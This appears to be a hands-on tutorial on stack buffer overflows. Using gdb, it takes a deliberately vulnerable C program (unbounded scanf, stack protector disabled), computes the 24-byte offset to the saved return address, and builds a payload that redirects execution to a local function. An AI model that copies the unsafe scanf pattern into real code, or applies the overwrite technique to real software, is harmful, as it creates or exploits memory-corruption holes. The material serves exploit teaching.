### Introduction

To gain control of the program flow we need to take control of the instruction pointer.
For this we can use the `leave` instruction from a function.
When entering in a function a stack frame is created.
The instruction pointer is `push` to the stack to save it  and the base instruction is also `push`
At the end of the function the `leave` instruction will restore the stack frame, by using `pop` to restore the base pointer
and the `ret` instruction will restore the instruction pointer by using `pop` again

```
; enter
push %rip
push %rbp

; leave
mov   %rbp, %rsp     # rsp = rbp,  mov  rsp,rbp in Intel syntax
pop   %rbp

; ret
pop %rip
```


### Compute length to override the instruction pointer saved into the stack

We already saw the bases of overflow [here](basic.md).
Let's see how we can control the instruction point.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void flow_controled() {
  printf("GG you successfully control the program flow \n");
}

int main () {
  char buf[16];
  scanf("%s", buf);
  return 0;
}

```

Just compile it with : 
```
gcc main.c -fno-stack-protector
```

You probably already see the vuln, `scanf` do not check any length for buf.
We found are vulnerability, let's exploit it.

run you binary with gdb
and break on main and run the program

```
$ gdb ./a.out
>>> b main
Breakpoint 1 at 0x---------
>>>  r
```

So we just put a breakpoint tell gdb to break the binary flow at the lib c entry point main, basically the begining of the program.
We can now search for the address of the flow_controled function, we want to redirect the program flow here, remember. 
```
>>> x flow_controled
0x555555555149 <flow_controled>:	0xe5894855
```
`0x555555555149` nice, we have the address. Now we need to put it where the old instruction pointe is, like that the ret will pop this value instead of the original one into the instruction pointer.

We need first the address of our `buf` variable.
Simple let's go after the `scanf` called and inspect the stack to get the address of `buf`
To do so use `ni`, meaning next instruction until the scanf called have been done.
You can check the flow by using `disass` command

```
   0x000055555555515c <+0>:	push   %rbp
   0x000055555555515d <+1>:	mov    %rsp,%rbp
=> 0x0000555555555160 <+4>:	sub    $0x10,%rsp
   0x0000555555555164 <+8>:	lea    -0x10(%rbp),%rax
   0x0000555555555168 <+12>:	mov    %rax,%rsi
   0x000055555555516b <+15>:	lea    0xec4(%rip),%rdi        # 0x555555556036
   0x0000555555555172 <+22>:	mov    $0x0,%eax
   0x0000555555555177 <+27>:	call   0x555555555040 <scanf@plt>
   0x000055555555517c <+32>:	mov    $0x0,%eax
   0x0000555555555181 <+37>:	leave  
   0x0000555555555182 <+38>:	ret    
>>> ni
Dump of assembler code for function main:
   0x000055555555515c <+0>:	push   %rbp
   0x000055555555515d <+1>:	mov    %rsp,%rbp
   0x0000555555555160 <+4>:	sub    $0x10,%rsp
=> 0x0000555555555164 <+8>:	lea    -0x10(%rbp),%rax
   0x0000555555555168 <+12>:	mov    %rax,%rsi
   0x000055555555516b <+15>:	lea    0xec4(%rip),%rdi        # 0x555555556036
   0x0000555555555172 <+22>:	mov    $0x0,%eax
   0x0000555555555177 <+27>:	call   0x555555555040 <scanf@plt>
   0x000055555555517c <+32>:	mov    $0x0,%eax
   0x0000555555555181 <+37>:	leave
   0x0000555555555182 <+38>:	ret
>>> ni
>>> ni
>>> ni
>>> ni
   0x000055555555515c <+0>:	push   %rbp
   0x000055555555515d <+1>:	mov    %rsp,%rbp
   0x0000555555555160 <+4>:	sub    $0x10,%rsp
   0x0000555555555164 <+8>:	lea    -0x10(%rbp),%rax
   0x0000555555555168 <+12>:	mov    %rax,%rsi
   0x000055555555516b <+15>:	lea    0xec4(%rip),%rdi        # 0x555555556036
   0x0000555555555172 <+22>:	mov    $0x0,%eax
=> 0x0000555555555177 <+27>:	call   0x555555555040 <scanf@plt>
   0x000055555555517c <+32>:	mov    $0x0,%eax
   0x0000555555555181 <+37>:	leave
   0x0000555555555182 <+38>:	ret
>>> ni


```

It should now wait for your input.
Just enter some values, like `BBBBBBB`, since b is 0x42, it's pretty easy to find it on the stack :)
Let entrer thoses caracteres and inspects the stack, to do so you can use `x` aka examine command
like

```
>>> x/20x $rsp
0x7fffffffe0b0:	0x42424242	0x00424242	0x00000000	0x00000000
0x7fffffffe0c0:	0x55555190	0x00005555	0xf7e0d152	0x00007fff
0x7fffffffe0d0:	0xffffe1b8	0x00007fff	0xf7e0cf73	0x00000001
0x7fffffffe0e0:	0x5555515c	0x00005555	0x00000000	0x00000010
0x7fffffffe0f0:	0x00000000	0x00000000	0xe3d9f304	0x3458e3ea
```

Yes we can see our `0x42`, so we have the address of `buf` now.
`0x7fffffffe0b0` one good step. 

Now let's find about the instruction pointer. to do so, use next instruction to go after the `leave` instruction
```
>>> ni
   0x000055555555515c <+0>:	push   %rbp
   0x000055555555515d <+1>:	mov    %rsp,%rbp
   0x0000555555555160 <+4>:	sub    $0x10,%rsp
   0x0000555555555164 <+8>:	lea    -0x10(%rbp),%rax
   0x0000555555555168 <+12>:	mov    %rax,%rsi
   0x000055555555516b <+15>:	lea    0xec4(%rip),%rdi        # 0x555555556036
   0x0000555555555172 <+22>:	mov    $0x0,%eax
   0x0000555555555177 <+27>:	call   0x555555555040 <scanf@plt>
   0x000055555555517c <+32>:	mov    $0x0,%eax
   0x0000555555555181 <+37>:	leave
=> 0x0000555555555182 <+38>:	ret
```

In other words, we just copy the base pointer into the stack pointer, and restore the base pointeur with the value stored in the stack.
Now the stack frame have been restore and the stack pointer should point to the old instruction pointer value on stack
So we can find the old instruction pointer address on stack by examine the stack pointer

```
>>> x $rsp
0x7fffffffe0c8:	0xf7e0d152
```

Yeah !!! 
So we have the buf address `0x7fffffffe0b0` and the address where the instruction pointer is stored `0x7fffffffe0c8`
With the difference between them we know the amount of bytes to write before overriding the stored instruction pointer value.

`0x7fffffffe0c8 - 0x7fffffffe0b0 = 24`


### Redirecte program flow

We have the length until the instruction pointer, we just need to create the payload
Basically from buffer to `rip` store on the stack.

Our payload will now be like since we do not have anything else on the stack except our buf.

| 16 bytes for buf | 8 bytes for the old base pointer  | flow_controler addr in little endian |
| -----------------|-----------------------------------|--------------------------------------|
| BBBBBBBBBBBBBBBB |               BBBBBBBB            |      \x49\x51\x55\x55\x55\x55        |


We just override the instruction pointer on the stack with the value we want, here with the address of the flow_controled function.
After that the `leave` instruction restore the stack frame and make the stack pointer point into the old instruction pointer where we replace with the flow_controled address.
Then the `ret` instruction will use a pop instruction to load the stored instruction pointer on the stack into the instruction pointer 
We just control the instruction pointer to redirect the program flow where we want ! :)
